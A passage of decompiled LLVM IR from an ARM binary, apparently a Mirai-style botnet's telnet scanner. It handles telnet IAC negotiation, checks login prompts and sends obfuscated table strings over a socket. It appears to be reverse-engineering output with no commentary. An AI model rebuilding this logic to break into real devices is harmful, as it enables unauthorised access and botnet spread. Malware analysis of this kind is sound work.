  %v2_f638 = icmp eq i32 %v0_f638, 0
  store i1 %v2_f638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f638, label %dec_label_pc_f3ec.loopexit, label %dec_label_pc_f640

dec_label_pc_f640:                                ; preds = %dec_label_pc_f638, %dec_label_pc_fc48, %dec_label_pc_fa88, %dec_label_pc_f95c, %dec_label_pc_f888, %dec_label_pc_f6e4, %dec_label_pc_ff1c, %dec_label_pc_fec0
  %v0_f640 = load i32, i32* @r6, align 4
  %v1_f640 = add i32 %v0_f640, 24
  %v2_f640 = inttoptr i32 %v1_f640 to i32*
  %v3_f640 = load i32, i32* %v2_f640, align 4
  %v0_f644 = load i32, i32* @r7, align 4
  %v2_f644 = sub i32 %v0_f644, %v3_f640
  %v3_f644 = icmp uge i32 %v0_f644, %v3_f640
  store i1 %v3_f644, i1* %cpsr_c.global-to-local, align 1
  %v4_f644 = xor i32 %v0_f644, %v3_f640
  %v5_f644 = xor i32 %v2_f644, %v0_f644
  %v6_f644 = and i32 %v5_f644, %v4_f644
  %v7_f644 = icmp slt i32 %v6_f644, 0
  %v8_f644 = icmp slt i32 %v2_f644, 0
  %v9_f644 = icmp eq i32 %v0_f644, %v3_f640
  store i1 %v9_f644, i1* %cpsr_z.global-to-local, align 1
  %v2_f648 = xor i1 %v8_f644, %v7_f644
  %v0_f644.v3_f640 = select i1 %v2_f648, i32 %v0_f644, i32 %v3_f640
  store i32 %v0_f644.v3_f640, i32* %r1.global-to-local, align 4
  %v2_f650 = sub i32 %v3_f640, %v0_f644.v3_f640
  store i32 %v2_f650, i32* @r2, align 4
  store i32 %v2_f650, i32* %v2_f640, align 4
  %v0_f658 = load i32, i32* @fp, align 4
  %v1_f658 = load i32, i32* %r1.global-to-local, align 4
  %v2_f658 = add i32 %v1_f658, %v0_f658
  store i32 %v2_f658, i32* @r1, align 4
  store i32 %v0_f658, i32* @r0, align 4
  %v3_f660 = call i32 @memmove(i32 %v0_f658, i32 %v2_f658, i32 %v2_f650)
  br label %dec_label_pc_f470

dec_label_pc_f668:                                ; preds = %dec_label_pc_f470
  %v1_f668 = add i32 %v0_f470, 24
  %v2_f668 = inttoptr i32 %v1_f668 to i32*
  %v3_f668 = load i32, i32* %v2_f668, align 4
  store i32 %v3_f668, i32* %r2.global-to-local, align 4
  %v1_f66c = add i32 %v3_f668, -1
  store i32 %v1_f66c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f670 = icmp eq i32 %v1_f66c, 0
  store i1 %v2_f670, i1* %cpsr_z.global-to-local, align 1
  %tmp432 = icmp slt i32 %v1_f66c, 1
  br i1 %tmp432, label %dec_label_pc_f3f0.backedge.thread, label %dec_label_pc_f678

dec_label_pc_f678:                                ; preds = %dec_label_pc_f668
  %v2_f678 = add i32 %v1_f66c, %v0_f470
  store i32 %v2_f678, i32* %r3.global-to-local, align 4
  %v1_f67c = add i32 %v2_f678, 28
  %v2_f67c = inttoptr i32 %v1_f67c to i8*
  %v3_f67c = load i8, i8* %v2_f67c, align 1
  %v4_f67c = zext i8 %v3_f67c to i32
  store i32 %v4_f67c, i32* %r3.global-to-local, align 4
  %v2_f680 = icmp ugt i8 %v3_f67c, 61
  store i1 %v2_f680, i1* %cpsr_c.global-to-local, align 1
  %v7_f680 = icmp eq i8 %v3_f67c, 62
  store i1 %v7_f680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f680, label %dec_label_pc_f6e4, label %bb433

bb433:                                            ; preds = %dec_label_pc_f678
  %v3_f684 = icmp ugt i8 %v3_f67c, 57
  store i1 %v3_f684, i1* %cpsr_c.global-to-local, align 1
  %v8_f684 = icmp eq i8 %v3_f67c, 58
  store i1 %v8_f684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f684, label %dec_label_pc_f6e4, label %dec_label_pc_f68c

dec_label_pc_f68c:                                ; preds = %bb433
  %v2_f68c = icmp ugt i8 %v3_f67c, 35
  store i1 %v2_f68c, i1* %cpsr_c.global-to-local, align 1
  %v7_f68c = icmp eq i8 %v3_f67c, 36
  store i1 %v7_f68c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f68c, label %dec_label_pc_f6e4, label %dec_label_pc_f694

dec_label_pc_f694:                                ; preds = %dec_label_pc_f68c
  %v2_f694 = icmp ugt i8 %v3_f67c, 34
  store i1 %v2_f694, i1* %cpsr_c.global-to-local, align 1
  %v7_f694 = icmp eq i8 %v3_f67c, 35
  store i1 %v7_f694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f694, label %dec_label_pc_f6e4, label %dec_label_pc_f69c

dec_label_pc_f69c:                                ; preds = %dec_label_pc_f694
  %v2_f69c = icmp ugt i8 %v3_f67c, 36
  store i1 %v2_f69c, i1* %cpsr_c.global-to-local, align 1
  %v7_f69c = icmp eq i8 %v3_f67c, 37
  store i1 %v7_f69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f69c, label %dec_label_pc_f6e4, label %dec_label_pc_f6cc.preheader

dec_label_pc_f6cc.preheader:                      ; preds = %dec_label_pc_f69c
  %v3_f6a0 = add i32 %v0_f470, 28
  %v2_f6a4 = add i32 %v3_f6a0, %v3_f668
  store i32 %v2_f6a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f6cc

dec_label_pc_f6b0:                                ; preds = %bb434
  %v2_f6b0 = icmp ugt i8 %v3_f6d4, 35
  store i1 %v2_f6b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6b0 = icmp eq i8 %v3_f6d4, 36
  store i1 %v7_f6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6b0, label %dec_label_pc_f6e4, label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6b0
  %v2_f6b8 = icmp ugt i8 %v3_f6d4, 34
  store i1 %v2_f6b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6b8 = icmp eq i8 %v3_f6d4, 35
  store i1 %v7_f6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6b8, label %dec_label_pc_f6e4, label %dec_label_pc_f6c0

dec_label_pc_f6c0:                                ; preds = %dec_label_pc_f6b8
  %v2_f6c0 = icmp ugt i8 %v3_f6d4, 36
  store i1 %v2_f6c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6c0 = icmp eq i8 %v3_f6d4, 37
  store i1 %v7_f6c0, i1* %cpsr_z.global-to-local, align 1
  %v1_f6c4 = add i32 %v0_f6c4, -1
  store i32 %v1_f6c4, i32* %r3.global-to-local, align 4
  br i1 %v7_f6c0, label %dec_label_pc_f6e4, label %dec_label_pc_f6cc

dec_label_pc_f6cc:                                ; preds = %dec_label_pc_f6cc.preheader, %dec_label_pc_f6c0
  %v0_f6c4 = phi i32 [ %v2_f6a4, %dec_label_pc_f6cc.preheader ], [ %v1_f6c4, %dec_label_pc_f6c0 ]
  %v0_f6cc = phi i32 [ %v1_f66c, %dec_label_pc_f6cc.preheader ], [ %v1_f6cc, %dec_label_pc_f6c0 ]
  %v1_f6cc = add i32 %v0_f6cc, -1
  store i32 %v1_f6cc, i32* %r1.global-to-local, align 4
  %v2_f6cc = icmp ne i32 %v0_f6cc, 0
  store i1 %v2_f6cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6cc = icmp eq i32 %v0_f6cc, 1
  store i1 %v7_f6cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6cc, label %dec_label_pc_f3f0.backedge.thread564, label %dec_label_pc_f6d4

dec_label_pc_f6d4:                                ; preds = %dec_label_pc_f6cc
  %v1_f6d4 = add i32 %v0_f6c4, -2
  %v2_f6d4 = inttoptr i32 %v1_f6d4 to i8*
  %v3_f6d4 = load i8, i8* %v2_f6d4, align 1
  %v4_f6d4 = zext i8 %v3_f6d4 to i32
  store i32 %v4_f6d4, i32* %r2.global-to-local, align 4
  %v2_f6d8 = icmp ugt i8 %v3_f6d4, 61
  store i1 %v2_f6d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6d8 = icmp eq i8 %v3_f6d4, 62
  store i1 %v7_f6d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6d8, label %dec_label_pc_f6e4, label %bb434

bb434:                                            ; preds = %dec_label_pc_f6d4
  %v3_f6dc = icmp ugt i8 %v3_f6d4, 57
  store i1 %v3_f6dc, i1* %cpsr_c.global-to-local, align 1
  %v8_f6dc = icmp eq i8 %v3_f6d4, 58
  store i1 %v8_f6dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f6dc, label %dec_label_pc_f6e4, label %dec_label_pc_f6b0

dec_label_pc_f6e4:                                ; preds = %dec_label_pc_f6d4, %bb434, %dec_label_pc_f6c0, %dec_label_pc_f6b8, %dec_label_pc_f6b0, %dec_label_pc_f69c, %dec_label_pc_f678, %dec_label_pc_f694, %dec_label_pc_f68c, %bb433
  %v0_f6e8 = phi i32 [ %v1_f66c, %dec_label_pc_f69c ], [ %v1_f66c, %dec_label_pc_f678 ], [ %v1_f66c, %dec_label_pc_f694 ], [ %v1_f66c, %dec_label_pc_f68c ], [ %v1_f66c, %bb433 ], [ %v1_f6cc, %dec_label_pc_f6b0 ], [ %v1_f6cc, %dec_label_pc_f6b8 ], [ %v1_f6cc, %dec_label_pc_f6c0 ], [ %v1_f6cc, %bb434 ], [ %v1_f6cc, %dec_label_pc_f6d4 ]
  %v1_f6e8 = add i32 %v0_f6e8, 1
  store i32 %v1_f6e8, i32* @r7, align 4
  %v1_f6ec = call i32 @table_unlock_val(i32 10)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_f6fc = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_f700 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f700, i32* %r2.global-to-local, align 4
  store i32 %v3_f6fc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f70c = load i32, i32* @r6, align 4
  %v1_f70c = add i32 %v0_f70c, 4
  %v2_f70c = inttoptr i32 %v1_f70c to i32*
  %v3_f70c = load i32, i32* %v2_f70c, align 4
  %v4_f710 = call i32 @__libc_send(i32 %v3_f70c, i32 %v3_f6fc, i32 %v3_f700, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f720 = load i32, i32* @r6, align 4
  %v1_f720 = add i32 %v0_f720, 4
  %v2_f720 = inttoptr i32 %v1_f720 to i32*
  %v3_f720 = load i32, i32* %v2_f720, align 4
  %v4_f724 = call i32 @__libc_send(i32 %v3_f720, i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32 2, i32 16384)
  %v1_f72c = call i32 @table_lock_val(i32 10)
  store i32 10, i32* @r3, align 4
  %v1_f734 = load i32, i32* @r6, align 4
  %v2_f734 = add i32 %v1_f734, 12
  %v3_f734 = inttoptr i32 %v2_f734 to i32*
  store i32 10, i32* %v3_f734, align 4
  br label %dec_label_pc_f640

dec_label_pc_f73c:                                ; preds = %dec_label_pc_f470
  %v1_f73c = add i32 %v0_f470, 24
  %v2_f73c = inttoptr i32 %v1_f73c to i32*
  %v3_f73c = load i32, i32* %v2_f73c, align 4
  store i32 %v3_f73c, i32* %r1.global-to-local, align 4
  %v0_f740 = load i32, i32* @fp, align 4
  store i32 %v0_f740, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_f748172 = icmp eq i32 %v3_f73c, 0
  store i1 %v3_f748172, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f748172, i1* %cpsr_z.global-to-local, align 1
  %v6_f74c179 = icmp sgt i32 %v3_f73c, 0
  br i1 %v6_f74c179, label %dec_label_pc_f750.preheader, label %dec_label_pc_f7fc

dec_label_pc_f748.loopexit:                       ; preds = %dec_label_pc_f76c
  %v2_f774 = add i32 %v1_f774, 2
  store i32 %v2_f774, i32* @r4, align 4
  %v2_f778 = add i32 %v1_f778, 2
  store i32 %v2_f778, i32* @r7, align 4
  %v3_f748 = icmp uge i32 %v2_f778, %v1_f748
  store i1 %v3_f748, i1* %cpsr_c.global-to-local, align 1
  %v9_f748 = icmp eq i32 %v2_f778, %v1_f748
  store i1 %v9_f748, i1* %cpsr_z.global-to-local, align 1
  %v6_f74c = icmp slt i32 %v2_f778, %v1_f748
  br i1 %v6_f74c, label %dec_label_pc_f750.preheader, label %dec_label_pc_f7fc

dec_label_pc_f750.preheader:                      ; preds = %dec_label_pc_f73c, %dec_label_pc_f748.loopexit
  %v6_f804273 = phi i32 [ %v6_f804274, %dec_label_pc_f748.loopexit ], [ %v0_f470, %dec_label_pc_f73c ]
  %v1_f778262 = phi i32 [ %v2_f778, %dec_label_pc_f748.loopexit ], [ 0, %dec_label_pc_f73c ]
  %v1_f75c260 = phi i32 [ %v1_f748, %dec_label_pc_f748.loopexit ], [ %v3_f73c, %dec_label_pc_f73c ]
  %v0_f750258 = phi i32 [ %v2_f774, %dec_label_pc_f748.loopexit ], [ %v0_f740, %dec_label_pc_f73c ]
  br label %dec_label_pc_f750

dec_label_pc_f750:                                ; preds = %dec_label_pc_f750.preheader, %dec_label_pc_f7e0
  %v6_f804274 = phi i32 [ %v6_f804273, %dec_label_pc_f750.preheader ], [ %v0_f7e8, %dec_label_pc_f7e0 ]
  %v1_f778 = phi i32 [ %v1_f778262, %dec_label_pc_f750.preheader ], [ %v1_f7ec, %dec_label_pc_f7e0 ]
  %v1_f748 = phi i32 [ %v1_f75c260, %dec_label_pc_f750.preheader ], [ %v3_f7e8, %dec_label_pc_f7e0 ]
  %v1_f774 = phi i32 [ %v0_f750258, %dec_label_pc_f750.preheader ], [ %v1_f7f4, %dec_label_pc_f7e0 ]
  %v1_f750 = inttoptr i32 %v1_f774 to i8*
  %v2_f750 = load i8, i8* %v1_f750, align 1
  %v3_f750 = zext i8 %v2_f750 to i32
  store i32 %v3_f750, i32* @r3, align 4
  %v2_f754 = icmp eq i8 %v2_f750, -1
  store i1 %v2_f754, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f754, label %dec_label_pc_f75c, label %dec_label_pc_f7fc

dec_label_pc_f75c:                                ; preds = %dec_label_pc_f750
  %v0_f75c = load i32, i32* @fp, align 4
  %v2_f75c = add i32 %v0_f75c, %v1_f748
  store i32 %v2_f75c, i32* %r2.global-to-local, align 4
  %v1_f760 = add i32 %v1_f774, 1
  store i32 %v1_f760, i32* @r5, align 4
  %v3_f764 = icmp uge i32 %v2_f75c, %v1_f760
  store i1 %v3_f764, i1* %cpsr_c.global-to-local, align 1
  %v9_f764 = icmp eq i32 %v2_f75c, %v1_f760
  store i1 %v9_f764, i1* %cpsr_z.global-to-local, align 1
  %v2_f768 = xor i1 %v3_f764, true
  %v3_f768 = or i1 %v9_f764, %v2_f768
  br i1 %v3_f768, label %dec_label_pc_f7fc, label %dec_label_pc_f76c

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f75c
  %v2_f76c = inttoptr i32 %v1_f760 to i8*
  %v3_f76c = load i8, i8* %v2_f76c, align 1
  %v4_f76c = zext i8 %v3_f76c to i32
  store i32 %v4_f76c, i32* @r3, align 4
  %v2_f770 = icmp eq i8 %v3_f76c, -1
  store i1 %v2_f770, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f770, label %dec_label_pc_f748.loopexit, label %dec_label_pc_f780

dec_label_pc_f780:                                ; preds = %dec_label_pc_f76c
  %v2_f780 = icmp ugt i8 %v3_f76c, -4
  store i1 %v2_f780, i1* %cpsr_c.global-to-local, align 1
  %v7_f780 = icmp eq i8 %v3_f76c, -3
  store i1 %v7_f780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f780, label %dec_label_pc_fdc0, label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %dec_label_pc_f780
  %v1_f788 = add i32 %v1_f774, 2
  store i32 %v1_f788, i32* @r3, align 4
  %v3_f78c = icmp uge i32 %v2_f75c, %v1_f788
  store i1 %v3_f78c, i1* %cpsr_c.global-to-local, align 1
  %v9_f78c = icmp eq i32 %v2_f75c, %v1_f788
  store i1 %v9_f78c, i1* %cpsr_z.global-to-local, align 1
  %v2_f790 = xor i1 %v3_f78c, true
  %v3_f790 = or i1 %v9_f78c, %v2_f790
  br i1 %v3_f790, label %dec_label_pc_f7fc, label %dec_label_pc_f794

dec_label_pc_f794:                                ; preds = %dec_label_pc_fe24, %bb458, %.thread147, %dec_label_pc_f788
  %v0_f794 = load i32, i32* @r5, align 4
  %v1_f794 = inttoptr i32 %v0_f794 to i8*
  %v2_f794 = load i8, i8* %v1_f794, align 1
  %v3_f794 = zext i8 %v2_f794 to i32
  store i32 %v3_f794, i32* %r3.global-to-local, align 4
  %v2_f798 = icmp ugt i8 %v2_f794, -4
  store i1 %v2_f798, i1* %cpsr_c.global-to-local, align 1
  %v7_f798 = icmp eq i8 %v2_f794, -3
  store i1 %v7_f798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f798, label %.thread97, label %dec_label_pc_f7a8

.thread97:                                        ; preds = %dec_label_pc_f794
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f794, align 1
  %v0_f7a4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f7a4.pr.pr, label %.thread100, label %.thread97.dec_label_pc_f7a8thread-pre-split_crit_edge

.thread97.dec_label_pc_f7a8thread-pre-split_crit_edge: ; preds = %.thread97
  %v0_f7a8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f7a8

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f794, %.thread97.dec_label_pc_f7a8thread-pre-split_crit_edge
  %v0_f7a8.pr = phi i32 [ %v0_f7a8.pr.pre, %.thread97.dec_label_pc_f7a8thread-pre-split_crit_edge ], [ %v3_f794, %dec_label_pc_f794 ]
  %v2_f7a8 = icmp ugt i32 %v0_f7a8.pr, 250
  store i1 %v2_f7a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a8 = icmp eq i32 %v0_f7a8.pr, 251
  store i1 %v7_f7a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7a8, label %bb435, label %.thread100

bb435:                                            ; preds = %dec_label_pc_f7a8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f7b0 = load i32, i32* @r5, align 4
  %v4_f7b0 = inttoptr i32 %v3_f7b0 to i8*
  store i8 -3, i8* %v4_f7b0, align 1
  br label %.thread100

.thread100:                                       ; preds = %dec_label_pc_f7a8, %.thread97, %bb435
  %v0_f7b4 = load i32, i32* @r4, align 4
  %v1_f7b4 = add i32 %v0_f7b4, 2
  %v2_f7b4 = inttoptr i32 %v1_f7b4 to i8*
  %v3_f7b4 = load i8, i8* %v2_f7b4, align 1
  %v4_f7b4 = zext i8 %v3_f7b4 to i32
  store i32 %v4_f7b4, i32* %r3.global-to-local, align 4
  %v2_f7b8 = icmp ugt i8 %v3_f7b4, -4
  store i1 %v2_f7b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b8 = icmp eq i8 %v3_f7b4, -3
  store i1 %v7_f7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7b8, label %.thread101, label %dec_label_pc_f7c8

.thread101:                                       ; preds = %.thread100
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f7b4, align 1
  %v0_f7c4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f7c4.pr.pr, label %.thread104, label %.thread101.dec_label_pc_f7c8thread-pre-split_crit_edge

.thread101.dec_label_pc_f7c8thread-pre-split_crit_edge: ; preds = %.thread101
  %v0_f7c8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f7c8

dec_label_pc_f7c8:                                ; preds = %.thread100, %.thread101.dec_label_pc_f7c8thread-pre-split_crit_edge
  %v0_f7c8.pr = phi i32 [ %v0_f7c8.pr.pre, %.thread101.dec_label_pc_f7c8thread-pre-split_crit_edge ], [ %v4_f7b4, %.thread100 ]
  %v2_f7c8 = icmp ugt i32 %v0_f7c8.pr, 250
  store i1 %v2_f7c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c8 = icmp eq i32 %v0_f7c8.pr, 251
  store i1 %v7_f7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c8, label %bb436, label %.thread104

bb436:                                            ; preds = %dec_label_pc_f7c8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f7d0 = load i32, i32* @r4, align 4
  %v4_f7d0 = add i32 %v3_f7d0, 2
  %v5_f7d0 = inttoptr i32 %v4_f7d0 to i8*
  store i8 -3, i8* %v5_f7d0, align 1
  br label %.thread104

.thread104:                                       ; preds = %dec_label_pc_f7c8, %.thread101, %bb436
  %v0_f7d8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f7e0

dec_label_pc_f7e0:                                ; preds = %dec_label_pc_fed4, %.thread104
  %storemerge3 = phi i32 [ %v2_fdd8, %dec_label_pc_fed4 ], [ %v0_f7d8, %.thread104 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_fed4 ], [ 3, %.thread104 ]
  %v0_f7e4.in.in.in = load i32, i32* @r6, align 4
  %v0_f7e4.in.in = add i32 %v0_f7e4.in.in.in, 4
  %v0_f7e4.in = inttoptr i32 %v0_f7e4.in.in to i32*
  %v0_f7e4 = load i32, i32* %v0_f7e4.in, align 4
  store i32 %storemerge3, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f7e4 = call i32 @__libc_send(i32 %v0_f7e4, i32 %storemerge3, i32 %storemerge2, i32 16384)
  %v0_f7e8 = load i32, i32* @r6, align 4
  %v1_f7e8 = add i32 %v0_f7e8, 24
  %v2_f7e8 = inttoptr i32 %v1_f7e8 to i32*
  %v3_f7e8 = load i32, i32* %v2_f7e8, align 4
  store i32 %v3_f7e8, i32* %r1.global-to-local, align 4
  %v0_f7ec = load i32, i32* @r7, align 4
  %v1_f7ec = add i32 %v0_f7ec, 3
  store i32 %v1_f7ec, i32* @r7, align 4
  %v3_f7f0 = icmp uge i32 %v1_f7ec, %v3_f7e8
  store i1 %v3_f7f0, i1* %cpsr_c.global-to-local, align 1
  %v9_f7f0 = icmp eq i32 %v1_f7ec, %v3_f7e8
  store i1 %v9_f7f0, i1* %cpsr_z.global-to-local, align 1
  %v0_f7f4 = load i32, i32* @r4, align 4
  %v1_f7f4 = add i32 %v0_f7f4, 3
  store i32 %v1_f7f4, i32* @r4, align 4
  %v5_f7f8 = icmp slt i32 %v1_f7ec, %v3_f7e8
  br i1 %v5_f7f8, label %dec_label_pc_f750, label %dec_label_pc_f7fc

dec_label_pc_f7fc:                                ; preds = %dec_label_pc_f748.loopexit, %dec_label_pc_f750, %dec_label_pc_f7e0, %dec_label_pc_f788, %dec_label_pc_f75c, %dec_label_pc_f73c, %dec_label_pc_fdc0.dec_label_pc_f7fc.loopexit_crit_edge
  %v6_f804 = phi i32 [ %v0_fdf0, %dec_label_pc_fdc0.dec_label_pc_f7fc.loopexit_crit_edge ], [ %v0_f470, %dec_label_pc_f73c ], [ %v6_f804274, %dec_label_pc_f750 ], [ %v0_f7e8, %dec_label_pc_f7e0 ], [ %v6_f804274, %dec_label_pc_f788 ], [ %v6_f804274, %dec_label_pc_f75c ], [ %v6_f804274, %dec_label_pc_f748.loopexit ]
  %v0_f7fc = phi i32 [ %v0_f7fc.pre.pre, %dec_label_pc_fdc0.dec_label_pc_f7fc.loopexit_crit_edge ], [ 0, %dec_label_pc_f73c ], [ %v1_f778, %dec_label_pc_f750 ], [ %v1_f7ec, %dec_label_pc_f7e0 ], [ %v1_f778, %dec_label_pc_f788 ], [ %v1_f778, %dec_label_pc_f75c ], [ %v2_f778, %dec_label_pc_f748.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f7fc = icmp eq i32 %v0_f7fc, 0
  store i1 %v2_f7fc, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v0_f7fc, 1
  br i1 %tmp437, label %dec_label_pc_f638, label %bb438

bb438:                                            ; preds = %dec_label_pc_f7fc
  store i32 3, i32* @r3, align 4
  %v7_f804 = add i32 %v6_f804, 12
  %v8_f804 = inttoptr i32 %v7_f804 to i32*
  store i32 3, i32* %v8_f804, align 4
  br label %dec_label_pc_f638

dec_label_pc_f80c:                                ; preds = %dec_label_pc_f470
  %v1_f80c = add i32 %v0_f470, 24
  %v2_f80c = inttoptr i32 %v1_f80c to i32*
  %v3_f80c = load i32, i32* %v2_f80c, align 4
  store i32 %v3_f80c, i32* %r2.global-to-local, align 4
  %v1_f810 = add i32 %v3_f80c, -1
  store i32 %v1_f810, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f814 = icmp eq i32 %v1_f810, 0
  store i1 %v2_f814, i1* %cpsr_z.global-to-local, align 1
  %tmp439 = icmp slt i32 %v1_f810, 1
  br i1 %tmp439, label %dec_label_pc_f3f0.backedge.thread, label %dec_label_pc_f81c

dec_label_pc_f81c:                                ; preds = %dec_label_pc_f80c
  %v2_f81c = add i32 %v1_f810, %v0_f470
  store i32 %v2_f81c, i32* %r3.global-to-local, align 4
  %v1_f820 = add i32 %v2_f81c, 28
  %v2_f820 = inttoptr i32 %v1_f820 to i8*
  %v3_f820 = load i8, i8* %v2_f820, align 1
  %v4_f820 = zext i8 %v3_f820 to i32
  store i32 %v4_f820, i32* %r3.global-to-local, align 4
  %v2_f824 = icmp ugt i8 %v3_f820, 61
  store i1 %v2_f824, i1* %cpsr_c.global-to-local, align 1
  %v7_f824 = icmp eq i8 %v3_f820, 62
  store i1 %v7_f824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f824, label %dec_label_pc_f888, label %bb440

bb440:                                            ; preds = %dec_label_pc_f81c
  %v3_f828 = icmp ugt i8 %v3_f820, 57
  store i1 %v3_f828, i1* %cpsr_c.global-to-local, align 1
  %v8_f828 = icmp eq i8 %v3_f820, 58
  store i1 %v8_f828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f828, label %dec_label_pc_f888, label %dec_label_pc_f830

dec_label_pc_f830:                                ; preds = %bb440
  %v2_f830 = icmp ugt i8 %v3_f820, 35
  store i1 %v2_f830, i1* %cpsr_c.global-to-local, align 1
  %v7_f830 = icmp eq i8 %v3_f820, 36
  store i1 %v7_f830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f830, label %dec_label_pc_f888, label %dec_label_pc_f838

dec_label_pc_f838:                                ; preds = %dec_label_pc_f830
  %v2_f838 = icmp ugt i8 %v3_f820, 34
  store i1 %v2_f838, i1* %cpsr_c.global-to-local, align 1
  %v7_f838 = icmp eq i8 %v3_f820, 35
  store i1 %v7_f838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f838, label %dec_label_pc_f888, label %dec_label_pc_f840

dec_label_pc_f840:                                ; preds = %dec_label_pc_f838
  %v2_f840 = icmp ugt i8 %v3_f820, 36
  store i1 %v2_f840, i1* %cpsr_c.global-to-local, align 1
  %v7_f840 = icmp eq i8 %v3_f820, 37
  store i1 %v7_f840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f840, label %dec_label_pc_f888, label %dec_label_pc_f870.preheader

dec_label_pc_f870.preheader:                      ; preds = %dec_label_pc_f840
  %v3_f844 = add i32 %v0_f470, 28
  %v2_f848 = add i32 %v3_f844, %v3_f80c
  store i32 %v2_f848, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f870

dec_label_pc_f854:                                ; preds = %bb441
  %v2_f854 = icmp ugt i8 %v3_f878, 35
  store i1 %v2_f854, i1* %cpsr_c.global-to-local, align 1
  %v7_f854 = icmp eq i8 %v3_f878, 36
  store i1 %v7_f854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f854, label %dec_label_pc_f888, label %dec_label_pc_f85c

dec_label_pc_f85c:                                ; preds = %dec_label_pc_f854
  %v2_f85c = icmp ugt i8 %v3_f878, 34
  store i1 %v2_f85c, i1* %cpsr_c.global-to-local, align 1
  %v7_f85c = icmp eq i8 %v3_f878, 35
  store i1 %v7_f85c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f85c, label %dec_label_pc_f888, label %dec_label_pc_f864

dec_label_pc_f864:                                ; preds = %dec_label_pc_f85c
  %v2_f864 = icmp ugt i8 %v3_f878, 36
  store i1 %v2_f864, i1* %cpsr_c.global-to-local, align 1
  %v7_f864 = icmp eq i8 %v3_f878, 37
  store i1 %v7_f864, i1* %cpsr_z.global-to-local, align 1
  %v1_f868 = add i32 %v0_f868, -1
  store i32 %v1_f868, i32* %r3.global-to-local, align 4
  br i1 %v7_f864, label %dec_label_pc_f888, label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %dec_label_pc_f870.preheader, %dec_label_pc_f864
  %v0_f868 = phi i32 [ %v2_f848, %dec_label_pc_f870.preheader ], [ %v1_f868, %dec_label_pc_f864 ]
  %v0_f870 = phi i32 [ %v1_f810, %dec_label_pc_f870.preheader ], [ %v1_f870, %dec_label_pc_f864 ]
  %v1_f870 = add i32 %v0_f870, -1
  store i32 %v1_f870, i32* %r1.global-to-local, align 4
  %v2_f870 = icmp ne i32 %v0_f870, 0
  store i1 %v2_f870, i1* %cpsr_c.global-to-local, align 1
  %v7_f870 = icmp eq i32 %v0_f870, 1
